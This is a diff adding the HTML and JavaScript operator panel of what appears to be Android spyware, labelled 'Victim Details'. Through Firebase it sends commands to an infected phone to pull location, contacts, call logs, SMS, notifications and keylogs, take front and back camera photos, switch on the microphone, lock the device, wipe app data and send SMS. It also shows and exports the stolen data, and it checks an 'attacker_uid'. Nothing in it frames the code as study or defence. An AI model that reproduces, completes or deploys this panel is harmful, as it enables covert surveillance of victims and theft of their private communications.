@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>REU Panel - Victim Details</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #f5f5f5;
+        }
+        .navbar {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 15px 30px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            margin-right: 20px;
+        }
+        .container {
+            padding: 30px;
+        }
+        .section {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .section h3 {
+            color: #333;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+        .tab-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab {
+            padding: 10px 20px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .tab.active {
+            background: #667eea;
+            color: white;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .data-table td, .data-table th {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        .data-table tr:nth-child(even) {
+            background: #f9f9f9;
+        }
+        .command-box {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .command-btn {
+            padding: 10px 20px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .command-btn:hover { background: #5a67d8; }
+        .live-location {
+            height: 400px;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div>
+            <a href="dashboard.html" class="back-btn">← Back</a>
+            <span id="victimName">Loading...</span>
+        </div>
+        <div>
+            <span id="onlineStatus">● Checking...</span>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Command Center -->
+        <div class="section">
+            <h3>⚡ Command Center</h3>
+            <div class="command-box">
+                <button class="command-btn" onclick="sendCommand('get_location')">📍 Get Location</button>
+                <button class="command-btn" onclick="sendCommand('get_contacts')">👥 Get Contacts</button>
+                <button class="command-btn" onclick="sendCommand('get_call_logs')">📞 Get Call Logs</button>
+                <button class="command-btn" onclick="sendCommand('get_sms')">💬 Get SMS</button>
+                <button class="command-btn" onclick="sendCommand('get_notifications')">🔔 Get Notifications</button>
+                <button class="command-btn" onclick="sendCommand('get_installed_apps')">📦 Get Apps</button>
+                <button class="command-btn" onclick="sendCommand('get_keylogs')">⌨️ Get Keylogs</button>
+                <button class="command-btn" onclick="sendCommand('take_picture_front')">📸 Front Camera</button>
+                <button class="command-btn" onclick="sendCommand('take_picture_back')">📷 Back Camera</button>
+                <button class="command-btn" onclick="sendCommand('start_mic')">🎤 Start Mic</button>
+                <button class="command-btn" onclick="sendCommand('stop_mic')">⏹️ Stop Mic</button>
+                <button class="command-btn" onclick="sendCommand('lock_device')">🔒 Lock Device</button>
+                <button class="command-btn" onclick="sendCommand('clear_app_data')">🧹 Clear App Data</button>
+            </div>
+        </div>
+
+        <!-- Tabs Navigation -->
+        <div class="tab-container">
+            <div class="tab active" onclick="switchTab('overview')">📊 Overview</div>
+            <div class="tab" onclick="switchTab('location')">📍 Location</div>
+            <div class="tab" onclick="switchTab('notifications')">🔔 Notifications</div>
+            <div class="tab" onclick="switchTab('calls')">📞 Call Logs</div>
+            <div class="tab" onclick="switchTab('contacts')">👥 Contacts</div>
+            <div class="tab" onclick="switchTab('sms')">💬 SMS</div>
+            <div class="tab" onclick="switchTab('whatsapp')">💬 WhatsApp</div>
+            <div class="tab" onclick="switchTab('accounts')">🔐 Accounts</div>
+            <div class="tab" onclick="switchTab('apps')">📦 Apps</div>
+            <div class="tab" onclick="switchTab('files')">📁 Files</div>
+            <div class="tab" onclick="switchTab('keylogger')">⌨️ Keylogger</div>
+        </div>
+
+        <!-- Overview Tab -->
+        <div id="overview" class="tab-content active section">
+            <h3>📱 Device Information</h3>
+            <table class="data-table" id="deviceInfo">
+                <tr><th>Field</th><th>Value</th></tr>
+            </table>
+            
+            <h3 style="margin-top: 20px;">🔋 Battery & Network</h3>
+            <table class="data-table" id="batteryInfo">
+                <tr><th>Field</th><th>Value</th></tr>
+            </table>
+        </div>
+
+        <!-- Location Tab -->
+        <div id="location" class="tab-content section">
+            <h3>📍 Live Location</h3>
+            <div class="live-location" id="locationMap">
+                <p>Select "Get Location" to view</p>
+            </div>
+            <table class="data-table" id="locationHistory" style="margin-top: 20px;">
+                <tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th></tr>
+            </table>
+        </div>
+
+        <!-- SMS Tab -->
+        <div id="sms" class="tab-content section">
+            <h3>💬 SMS Manager</h3>
+            <div style="margin-bottom: 15px;">
+                <input type="text" id="smsNumber" placeholder="Phone Number" style="padding: 8px; width: 200px;">
+                <input type="text" id="smsMessage" placeholder="Message" style="padding: 8px; width: 300px;">
+                <button class="command-btn" onclick="sendSMS()">Send SMS</button>
+            </div>
+            <table class="data-table" id="smsList">
+                <tr><th>From</th><th>Message</th><th>Date</th><th>Type</th></tr>
+            </table>
+        </div>
+
+        <!-- Keylogger Tab -->
+        <div id="keylogger" class="tab-content section">
+            <h3>⌨️ Keylogger Logs</h3>
+            <button class="command-btn" onclick="sendCommand('get_keylogs')">Refresh Logs</button>
+            <button class="command-btn" onclick="exportKeylogs()">Export Logs</button>
+            <pre id="keylogsContent" style="background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; max-height: 500px; overflow: auto; margin-top: 15px;"></pre>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('id');
+        let deviceRef;
+        let currentTab = 'overview';
+
+        auth.onAuthStateChanged(async (user) => {
+            if (!user) {
+                window.location.href = 'index.html';
+                return;
+            }
+            currentUser = user;
+            
+            // Check access
+            const deviceSnap = await db.ref(`devices/${deviceId}`).once('value');
+            const deviceData = deviceSnap.val();
+            const ownerSnap = await db.ref('settings/owner_uid').once('value');
+            const ownerUid = ownerSnap.val();
+            
+            if (!deviceData || (deviceData.attacker_uid !== currentUser.uid && currentUser.uid !== ownerUid)) {
+                alert('Access denied!');
+                window.location.href = 'dashboard.html';
+                return;
+            }
+            
+            document.getElementById('victimName').innerText = deviceData.device_name || 'Unknown Device';
+            startRealTimeUpdates();
+        });
+
+        function startRealTimeUpdates() {
+            // Device info
+            db.ref(`devices/${deviceId}`).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (!data) return;
+                
+                const isOnline = data.last_seen && (Date.now() - data.last_seen < 300000);
+                document.getElementById('onlineStatus').innerHTML = isOnline ? 
+                    '<span style="color: #00ff00;">● Online</span>' : 
+                    '<span style="color: #999;">○ Offline</span>';
+                
+                if (currentTab === 'overview') {
+                    updateOverview(data);
+                }
+            });
+            
+            // Location updates
+            db.ref(`devices/${deviceId}/location`).limitToLast(10).on('value', (snapshot) => {
+                if (currentTab === 'location') updateLocation(snapshot.val());
+            });
+            
+            // SMS updates
+            db.ref(`devices/${deviceId}/sms`).limitToLast(50).on('value', (snapshot) => {
+                if (currentTab === 'sms') updateSMS(snapshot.val());
+            });
+            
+            // Keylogs
+            db.ref(`devices/${deviceId}/keylogs`).limitToLast(100).on('value', (snapshot) => {
+                if (currentTab === 'keylogger') updateKeylogs(snapshot.val());
+            });
+            
+            // Notifications
+            db.ref(`devices/${deviceId}/notifications`).limitToLast(50).on('value', (snapshot) => {
+                if (currentTab === 'notifications') updateNotifications(snapshot.val());
+            });
+        }
+
+        function updateOverview(data) {
+            const deviceHtml = `
+                <tr><td>Device Name</td><td>${data.device_name || 'N/A'}</td></tr>
+                <tr><td>Model</td><td>${data.model || 'N/A'}</td></tr>
+                <tr><td>Manufacturer</td><td>${data.manufacturer || 'N/A'}</td></tr>
+                <tr><td>Android Version</td><td>${data.android_version || 'N/A'}</td></tr>
+                <tr><td>SDK Version</td><td>${data.sdk_version || 'N/A'}</td></tr>
+                <tr><td>Country</td><td>${data.country || 'N/A'}</td></tr>
+                <tr><td>IP Address</td><td>${data.ip || 'N/A'}</td></tr>
+                <tr><td>First Seen</td><td>${data.first_seen ? new Date(data.first_seen).toLocaleString() : 'N/A'}</td></tr>
+                <tr><td>Last Seen</td><td>${data.last_seen ? new Date(data.last_seen).toLocaleString() : 'N/A'}</td></tr>
+            `;
+            document.getElementById('deviceInfo').innerHTML += deviceHtml;
+            
+            const batteryHtml = `
+                <tr><td>Battery Level</td><td>${data.battery_level || 'N/A'}%</td></tr>
+                <tr><td>Charging</td><td>${data.charging ? 'Yes' : 'No'}</td></tr>
+                <tr><td>Network Type</td><td>${data.network_type || 'N/A'}</td></tr>
+                <tr><td>Phone Number</td><td>${data.phone_number || 'N/A'}</td></tr>
+                <tr><td>SIM Carrier</td><td>${data.sim_carrier || 'N/A'}</td></tr>
+            `;
+            document.getElementById('batteryInfo').innerHTML += batteryHtml;
+        }
+
+        function updateLocation(locations) {
+            if (!locations) return;
+            
+            let html = '';
+            const locationArray = Object.values(locations);
+            
+            // Get latest for map
+            const latest = locationArray[locationArray.length - 1];
+            if (latest) {
+                document.getElementById('locationMap').innerHTML = `
+                    <iframe 
+                        width="100%" 
+                        height="100%" 
+                        frameborder="0" 
+                        style="border:0"
+                        src="https://www.google.com/maps?q=${latest.lat},${latest.lng}&hl=es;z=14&output=embed"
+                        allowfullscreen>
+                    </iframe>
+                `;
+            }
+            
+            locationArray.reverse().forEach(loc => {
+                html += `<tr>
+                    <td>${new Date(loc.timestamp).toLocaleString()}</td>
+                    <td>${loc.lat}</td>
+                    <td>${loc.lng}</td>
+                    <td>${loc.accuracy || 'N/A'}m</td>
+                </tr>`;
+            });
+            document.getElementById('locationHistory').innerHTML += html;
+        }
+
+        function updateSMS(sms) {
+            if (!sms) return;
+            
+            let html = '<tr><th>From</th><th>Message</th><th>Date</th><th>Type</th></tr>';
+            Object.values(sms).forEach(msg => {
+                html += `<tr>
+                    <td>${msg.address}</td>
+                    <td>${msg.body}</td>
+                    <td>${new Date(msg.date).toLocaleString()}</td>
+                    <td>${msg.type === 1 ? 'Inbox' : 'Sent'}</td>
+                </tr>`;
+            });
+            document.getElementById('smsList').innerHTML = html;
+        }
+
+        function updateKeylogs(keylogs) {
+            if (!keylogs) return;
+            
+            let logs = '';
+            Object.values(keylogs).forEach(log => {
+                logs += `[${new Date(log.timestamp).toLocaleString()}] ${log.package}: ${log.text}\n`;
+            });
+            document.getElementById('keylogsContent').innerText = logs || 'No keylogs yet';
+        }
+
+        function updateNotifications(notifications) {
+            if (!notifications) return;
+            
+            let html = '<table class="data-table"><tr><th>App</th><th>Title</th><th>Content</th><th>Time</th></tr>';
+            Object.values(notifications).forEach(notif => {
+                html += `<tr>
+                    <td>${notif.app_name}</td>
+                    <td>${notif.title}</td>
+                    <td>${notif.text}</td>
+                    <td>${new Date(notif.timestamp).toLocaleString()}</td>
+                </tr>`;
+            });
+            document.getElementById('notifications').innerHTML = html + '</table>';
+        }
+
+        function sendCommand(type) {
+            db.ref(`commands/${deviceId}`).push({
+                type: type,
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                status: 'pending'
+            }).then(() => {
+                alert(`Command ${type} sent!`);
+            });
+        }
+
+        function sendSMS() {
+            const number = document.getElementById('smsNumber').value;
+            const message = document.getElementById('smsMessage').value;
+            if (!number || !message) {
+                alert('Fill both fields!');
+                return;
+            }
+            
+            db.ref(`commands/${deviceId}`).push({
+                type: 'send_sms',
+                number: number,
+                message: message,
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                status: 'pending'
+            }).then(() => {
+                alert('SMS command sent!');
+            });
+        }
+
+        function exportKeylogs() {
+            const logs = document.getElementById('keylogsContent').innerText;
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `keylogs_${deviceId}_${Date.now()}.txt`;
+            a.click();
+        }
+
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            
+            document.querySelector(`.tab[onclick="switchTab('${tab}')"]`).classList.add('active');
+            document.getElementById(tab).classList.add('active');
+        }
+    </script>
+</body>
+</html>
